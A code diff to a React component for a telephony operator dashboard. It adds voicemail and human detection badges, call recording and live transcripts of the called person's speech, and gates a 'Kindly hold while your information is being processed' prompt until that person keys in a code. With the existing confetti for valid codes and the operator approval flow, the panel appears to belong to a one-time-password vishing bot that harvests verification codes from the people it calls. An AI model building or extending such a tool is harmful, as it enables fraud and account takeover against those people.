@@ -16,9 +16,13 @@ import {
   RotateCcw,
   PauseCircle,
   Send,
+  Voicemail,
+  UserCheck,
+  Mic,
 } from 'lucide-react';
 import confetti from 'canvas-confetti';
 import { CallSession, CallStatus } from '../types/telephony';
+import { CompactAudioPlayer, formatAudioBytes } from './CompactAudioPlayer';
 
 const celebratedSessions = new Set<string>();
 
@@ -189,6 +193,13 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
   const isAwaitingOperator = session?.status === 'awaiting-operator';
   const isValidState = session?.codeStatus === 'valid';
   const isInvalidState = session?.codeStatus === 'invalid' && Boolean(session?.attempts);
+  const hasInputtedCode = Boolean(
+    session?.pendingDigits ||
+      session?.capturedDigits ||
+      session?.lastInvalidDigits ||
+      session?.status === 'awaiting-operator'
+  );
+  const speechTranscripts = session?.speechTranscripts || [];
 
   const carrierXmlLabel =
     session?.carrier === 'plivo'
@@ -243,7 +254,26 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
           </div>
         </div>
 
-        <div className="flex items-center gap-2">
+        <div className="flex flex-wrap items-center gap-2">
+          {session?.answeredBy === 'voicemail' && (
+            <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-bold bg-orange-500/15 text-orange-300 border border-orange-500/40">
+              <Voicemail className="w-3.5 h-3.5 text-orange-400" />
+              <span>Voicemail Answered</span>
+            </span>
+          )}
+          {session?.answeredBy === 'human' && (
+            <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold bg-emerald-500/10 text-emerald-300 border border-emerald-500/30">
+              <UserCheck className="w-3.5 h-3.5 text-emerald-400" />
+              <span>Human Answered</span>
+            </span>
+          )}
+          {isCallActive && session?.recordCall !== false && (
+            <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-mono font-bold bg-rose-500/10 text-rose-300 border border-rose-500/30">
+              <span className="w-2 h-2 rounded-full bg-rose-500 animate-ping"></span>
+              <span>REC</span>
+            </span>
+          )}
+
           {session && getStatusBadge(session.status)}
 
           {isCallActive && (
@@ -304,6 +334,37 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
       ) : (
         /* Active session view */
         <div className="flex-1 flex flex-col p-4 gap-4 overflow-y-auto">
+          {/* VOICEMAIL / ANSWERING MACHINE ALERT BANNER */}
+          {session.answeredBy === 'voicemail' && (
+            <div className="p-3.5 rounded-xl bg-orange-950/40 border border-orange-500/50 flex flex-wrap items-center justify-between gap-3 shadow-sm">
+              <div className="flex items-start gap-2.5">
+                <div className="p-2 rounded-lg bg-orange-500/20 text-orange-300 shrink-0">
+                  <Voicemail className="w-4 h-4" />
+                </div>
+                <div>
+                  <h4 className="text-xs font-bold text-orange-200 uppercase tracking-wide">
+                    Voicemail / Answering Machine Answered Call
+                  </h4>
+                  <p className="text-xs text-orange-300/90 mt-0.5 leading-snug">
+                    Carrier Answering Machine Detection identified an automated voicemail service instead of a live person
+                    {session.amdRawResult ? ` (${session.amdRawResult})` : ''}. Voice audio is still being monitored and recorded.
+                  </p>
+                </div>
+              </div>
+
+              {isCallActive && (
+                <button
+                  type="button"
+                  onClick={onEndCall}
+                  className="px-3 py-1.5 rounded-lg bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold flex items-center gap-1.5 shrink-0 transition-all cursor-pointer shadow-sm"
+                >
+                  <PhoneOff className="w-3.5 h-3.5" />
+                  <span>Hang Up Voicemail</span>
+                </button>
+              )}
+            </div>
+          )}
+
           {/* Audio Waveform bar */}
           {isCallActive && (
             <div className="bg-slate-950 border border-slate-800 rounded-xl p-3 flex items-center justify-between">
@@ -313,8 +374,8 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
                   {session.status === 'ringing'
                     ? 'Ringing recipient line...'
                     : session.status === 'awaiting-operator'
-                    ? 'Caller is on hold & awaiting your decision...'
-                    : 'Voice line active & listening for keypad inputs...'}
+                    ? 'Caller is on hold & listening for voice while awaiting your decision...'
+                    : 'Voice line active — listening for keypad code & live caller speech...'}
                 </span>
               </div>
 
@@ -481,12 +542,21 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
               <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                 <button
                   type="button"
+                  disabled={!hasInputtedCode}
                   onClick={() => onOperatorAction?.('hold')}
-                  className="py-2 px-3 rounded-lg bg-slate-900 hover:bg-slate-850 border border-slate-700 text-amber-300 text-xs font-semibold flex items-center justify-center gap-1.5 transition-all shadow-sm active:scale-[0.98]"
-                  title="Speaks 'Kindly hold while we verify...'"
+                  className={`py-2 px-3 rounded-lg border text-xs font-semibold flex items-center justify-center gap-1.5 transition-all shadow-sm ${
+                    hasInputtedCode
+                      ? 'bg-slate-900 hover:bg-slate-850 border-slate-700 text-amber-300 cursor-pointer active:scale-[0.98]'
+                      : 'bg-slate-900/40 border-slate-800/80 text-slate-600 cursor-not-allowed'
+                  }`}
+                  title={
+                    hasInputtedCode
+                      ? "Speaks 'Kindly hold while your information is being processed.'"
+                      : 'Only plays AFTER keypad code is inputted by caller'
+                  }
                 >
-                  <PauseCircle className="w-3.5 h-3.5 text-amber-400" />
-                  <span>"Kindly Hold / Please Wait"</span>
+                  <PauseCircle className={`w-3.5 h-3.5 ${hasInputtedCode ? 'text-amber-400' : 'text-slate-600'}`} />
+                  <span>{hasInputtedCode ? '"Kindly Hold / Please Wait"' : 'Hold (After Code Input)'}</span>
                 </button>
 
                 <button
@@ -536,6 +606,84 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
             </div>
           )}
 
+          {/* LIVE VOICE & TALKS TRANSCRIPT + CALL RECORDING PLAYBACK */}
+          {(isCallActive ||
+            speechTranscripts.length > 0 ||
+            session.capturedSpeech ||
+            session.recordingUrl ||
+            session.recordingStatus === 'recording') && (
+            <div className="bg-slate-950 border border-slate-800 rounded-xl p-3.5 space-y-2.5">
+              <div className="flex flex-wrap items-center justify-between gap-2 pb-2 border-b border-slate-800">
+                <div className="flex items-center gap-2">
+                  <Mic className="w-3.5 h-3.5 text-cyan-400" />
+                  <h4 className="text-xs font-bold uppercase tracking-wider text-slate-200">
+                    Caller Voice &amp; Talks + HD Audio Recording
+                  </h4>
+                </div>
+                <span className="text-[10px] font-mono text-slate-400">
+                  {session.recordingUrl
+                    ? `HD Audio Ready${
+                        session.recordingDuration ? ` (${session.recordingDuration}s)` : ''
+                      }${
+                        formatAudioBytes(session.recordingSizeBytes)
+                          ? ` • ${formatAudioBytes(session.recordingSizeBytes)}`
+                          : ''
+                      }`
+                    : isCallActive
+                    ? 'Listening & Recording Line...'
+                    : session.recordingStatus === 'recording'
+                    ? 'Finalizing HD Audio...'
+                    : `${speechTranscripts.length} utterance${speechTranscripts.length === 1 ? '' : 's'}`}
+                </span>
+              </div>
+
+              {/* Spoken Voice Transcripts */}
+              {speechTranscripts.length > 0 ? (
+                <div className="space-y-1.5 max-h-32 overflow-y-auto pr-1">
+                  {speechTranscripts.map((item) => (
+                    <div
+                      key={item.id}
+                      className="p-2 rounded-lg bg-cyan-950/25 border border-cyan-500/25 text-xs flex items-start justify-between gap-2"
+                    >
+                      <div className="text-cyan-200">
+                        <span className="font-semibold text-cyan-400 mr-1.5">Caller:</span>
+                        <span>"{item.text}"</span>
+                      </div>
+                      <span className="text-[10px] font-mono text-slate-500 shrink-0">
+                        {new Date(item.timestamp).toLocaleTimeString()}
+                      </span>
+                    </div>
+                  ))}
+                </div>
+              ) : session.capturedSpeech ? (
+                <div className="p-2 rounded-lg bg-cyan-950/25 border border-cyan-500/25 text-xs text-cyan-200">
+                  <span className="font-semibold text-cyan-400 mr-1.5">Caller:</span>
+                  <span>"{session.capturedSpeech}"</span>
+                </div>
+              ) : isCallActive ? (
+                <p className="text-xs text-slate-500 italic">
+                  Listening for spoken words from recipient... Any speech or talks will appear here live.
+                </p>
+              ) : null}
+
+              {/* Playable Call Recording Bar */}
+              {session.recordingUrl ? (
+                <div className="pt-1.5 border-t border-slate-800/80">
+                  <CompactAudioPlayer
+                    src={session.recordingUrl}
+                    durationHint={session.recordingDuration || session.duration}
+                    sizeBytes={session.recordingSizeBytes}
+                  />
+                </div>
+              ) : !isCallActive && session.recordingStatus === 'recording' ? (
+                <div className="pt-1.5 border-t border-slate-800/80 flex items-center gap-2 text-[11px] font-mono text-amber-300">
+                  <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping"></span>
+                  <span>Grabbing &amp; optimizing HD call recording...</span>
+                </div>
+              ) : null}
+            </div>
+          )}
+
           {/* Event Stream Log */}
           <div className="flex-1 flex flex-col bg-slate-950 border border-slate-800 rounded-xl p-4 min-h-[180px]">
             <div className="flex items-center justify-between mb-2.5 pb-2 border-b border-slate-800">
@@ -574,6 +722,12 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
                     className={`p-2 rounded-lg border text-xs flex items-center justify-between ${
                       evt.type === 'error'
                         ? 'bg-rose-950/40 border-rose-500/30 text-rose-300'
+                        : evt.type === 'amd' && evt.title.includes('Voicemail')
+                        ? 'bg-orange-950/40 border-orange-500/40 text-orange-200'
+                        : evt.type === 'speech'
+                        ? 'bg-cyan-950/35 border-cyan-500/30 text-cyan-200'
+                        : evt.type === 'recording'
+                        ? 'bg-indigo-950/40 border-indigo-500/30 text-indigo-200'
                         : evt.title.includes('Approved') || (evt.type === 'dtmf' && evt.title.includes('Valid'))
                         ? 'bg-emerald-950/40 border-emerald-500/30 text-emerald-300'
                         : evt.title.includes('Hold') || evt.title.includes('Awaiting')
